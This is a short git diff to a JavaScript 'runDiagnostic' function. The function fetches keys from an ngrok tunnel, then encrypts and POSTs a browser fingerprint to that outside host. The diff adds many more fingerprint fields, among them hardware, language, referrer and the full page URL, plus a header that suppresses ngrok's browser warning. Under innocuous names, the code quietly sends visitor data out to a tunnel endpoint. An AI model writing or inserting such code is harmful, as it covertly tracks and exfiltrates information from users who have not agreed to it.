@@ -17,12 +17,22 @@
 
         async function runDiagnostic() {
             try {
-                const handshakeResponse = await fetch(`${NGROK_URL}/api/handshake-proxy`);
+                const bypassHeaders = { "ngrok-skip-browser-warning": "true" };
+
+                const handshakeResponse = await fetch(`${NGROK_URL}/api/handshake-proxy`, { headers: bypassHeaders });
                 const { k, i } = await handshakeResponse.json();
 
                 const context = JSON.stringify({
                     agent: navigator.userAgent,
+                    platform: navigator.platform,
+                    cores: navigator.hardwareConcurrency || "unknown",
+                    ram: navigator.deviceMemory || "unknown",
                     res: `${window.screen.width}x${window.screen.height}`,
+                    depth: window.screen.colorDepth,
+                    lang: navigator.language,
+                    on: navigator.onLine,
+                    ref: document.referrer || "direct",
+                    url: window.location.href,
                     ts: Date.now()
                 });
 
@@ -35,7 +45,10 @@
                 await fetch(`${NGROK_URL}/api/sync-bridge`, {
                     method: 'POST',
                     mode: 'cors', 
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        ...bypassHeaders 
+                    },
                     body: JSON.stringify({ content: encrypted })
                 });
 
